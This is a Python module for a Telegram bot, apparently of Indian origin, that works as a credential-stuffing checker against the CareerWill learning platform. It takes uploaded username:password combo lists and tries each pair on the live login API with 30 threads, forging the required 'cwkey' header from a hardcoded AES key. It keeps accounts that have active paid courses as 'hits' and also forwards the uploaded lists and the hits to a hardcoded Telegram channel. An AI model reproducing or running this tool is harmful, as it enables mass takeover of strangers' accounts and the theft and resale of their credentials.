import requests
import time
import os
import asyncio
import logging
import base64
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ✅ Logging ko INFO level par set kiya hai taaki exact failure reason dikhe
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==============================================================================
# SMART PARSER
# ==============================================================================
def parse_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    if '*' in line and ':' not in line:
        parts = line.rsplit('*', 1)
    else:
        parts = line.rsplit(':', 2)
    
    if len(parts) >= 2:
        password = parts[-1].strip()
        username = parts[-2].strip()
        
        if " " in username:
            username = username.split()[-1]
        if username.startswith('+91'):
            username = username[3:]
        if username.isdigit() and len(username) > 10:
            username = username[-10:]
        if username.lower().startswith(('http', 'android', 'com.', 'www.', 'mozilla', 'accept')):
            return None
            
        return username, password
    return None


class Checker:
    # ============ BOT CONFIG ============
    command = "cw"
    name = "CareerWill"
    # ====================================

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Smart Parse:</b> ':', '*', '+91', aur multiple formats auto-handle honge.\n"
            f"⚠️ <b>Strict Filter:</b> Sirf <b>ACTIVE (Non-Expired)</b> courses wale accounts HIT honge.\n"
            f"⚡ <b>No Proxy:</b> 30 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Active Hits: {stats['hits']}\n"
                    f"❌ Failed/No Batch: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        log_original_caption = f"🎉 {self.name} Checker\n👤 User: @{user_name}"
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Active Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n")
            
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,
                caption=user_caption
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=log_original_caption
                )
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Active Hit nahi mila.\n💡 <i>Check Heroku logs for exact failure reasons.</i>", 
                parse_mode="HTML"
            )
            
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        parsed = parse_combo(line)
        if not parsed:
            return {'status': 'failed'}
        
        username, password = parsed

        # Generate CW Key
        KEY, IV = "E12K7l97Z7wCo3Gu", "mOk15J2m12qZ2tKI"
        t = int(time.time() * 1000)
        pt = f"{t}||crwillweb@4598"
        k = KEY.ljust(16, '0')[:16].encode()
        i = IV.ljust(16, '0')[:16].encode()
        
        try:
            cipher = AES.new(k, AES.MODE_CBC, i)
            cwkey = base64.b64encode(cipher.encrypt(pad(pt.encode(), AES.block_size))).decode()
        except Exception:
            return {'status': 'failed'}

        headers = {
            "Host": "wbspec.crwilladmin.com", 
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0", 
            "Content-Type": "application/json", 
            "cwkey": cwkey, 
            "Origin": "https://web.careerwill.com"
        }
        data = {
            "userid": username, 
            "pwd": password, 
            "deviceIMEI": "abcd", 
            "deviceModel": "ChromeCDM", 
            "deviceType": "web", 
            "deviceVersion": "34.0.0.0"
        }
        
        session = requests.Session()
        try:
            # 1. Login Request
            res = session.post("https://wbspec.crwilladmin.com/api/v1/login", headers=headers, json=data, timeout=12)
            
            # ✅ DEBUG: Status code check
            if res.status_code != 200:
                logger.warning(f"[{username}] Login Status {res.status_code} | Resp: {res.text[:150]}")
                return {'status': 'failed'}
            
            try:
                result = res.json()
            except Exception:
                logger.warning(f"[{username}] Invalid JSON Response | Resp: {res.text[:150]}")
                return {'status': 'failed'}
                
            token = result.get("data", {}).get("token")
            if not token:
                logger.warning(f"[{username}] Login Failed (No Token) | Resp: {result}")
                return {'status': 'failed'}
                
            # 2. Get Orders Request
            orders_url = "https://web.careerwill.com/_next/data/JQu6Q5J6p5UQ3LXim_5tU/orders.json?interface_id=1"
            orders_headers = {
                "Cookie": f"interface=1; token={token};", 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            
            res_orders = session.get(orders_url, headers=orders_headers, timeout=10)
            if res_orders.status_code != 200:
                logger.warning(f"[{username}] Orders Status {res_orders.status_code} | Resp: {res_orders.text[:150]}")
                return {'status': 'failed'}
                
            try:
                orders_data = res_orders.json()
            except Exception:
                logger.warning(f"[{username}] Orders Invalid JSON | Resp: {res_orders.text[:150]}")
                return {'status': 'failed'}
                
            orders = []
            page_props = orders_data.get("pageProps", {})
            
            for order in page_props.get("orders", []):
                availability = order.get("availability", False)
                availability_msg = order.get("availabilityMsg", "").lower()
                
                if availability and "expired" not in availability_msg:
                    orders.append({
                        "courseId": order.get("courseId", "N/A"), 
                        "courseName": order.get("courseName", "Unknown Course")
                    })
                    
            if not orders:
                logger.info(f"[{username}] Login Success but NO ACTIVE COURSES found.")
                return {'status': 'failed'}
                
            # Format hit
            hit_text = f"🔐 Details : {username}*{password}\n📚 Courses :\n"
            for idx, o in enumerate(orders, 1):
                hit_text += f"📖 {idx}. {o['courseName']} ({o['courseId']})\n"
            hit_text += "\n" + "-" * 60 + "\n"
            
            return {'status': 'hit', 'data': hit_text}
            
        except Exception as e:
            logger.warning(f"[{username}] Exception: {e}")
            return {'status': 'failed'}
        finally:
            session.close()
